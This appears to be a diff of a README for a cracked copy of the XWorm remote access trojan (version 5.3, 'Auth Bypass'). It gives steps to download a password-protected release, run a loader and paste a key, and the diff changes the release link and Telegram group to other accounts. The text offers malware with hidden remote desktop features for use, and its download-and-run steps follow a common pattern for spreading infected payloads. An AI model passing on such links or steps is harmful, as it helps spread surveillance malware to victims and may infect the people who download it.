@@ -1,3 +1,5 @@
+# [Telegram](https://t.me/strikelab)
+
 # XWorm-V5.3 Auth Bypass
 ## ⚙️ Requirements :
 
@@ -17,9 +19,9 @@
 - ✅ HVNC Fixed
 
 ## 💎 Usage
-- Go to the [Release](https://github.com/DeathDealerSoftware/XWorm-V5.3/releases/tag/XWorm) page
+- Go to the [Release](https://github.com/SmokeLoader/XWorm-V5.3/releases/tag/XWorm) page
 - Download and extract with password @DeathDealerSoftware
 - Run the XWorm Loader (Special thanks to [ReverseEngineeringLab](https://t.me/reverseengineeringlab) who created the loader for XWorm 5.0-5.2 back then)
 - In the console is going to appear a bin. Copy it and paste it into the Bin field in XWorm
 
-# My [Telegram Group](https://t.me/DeathDealerSoftware)
+# My [Telegram Group](https://t.me/strikelab)
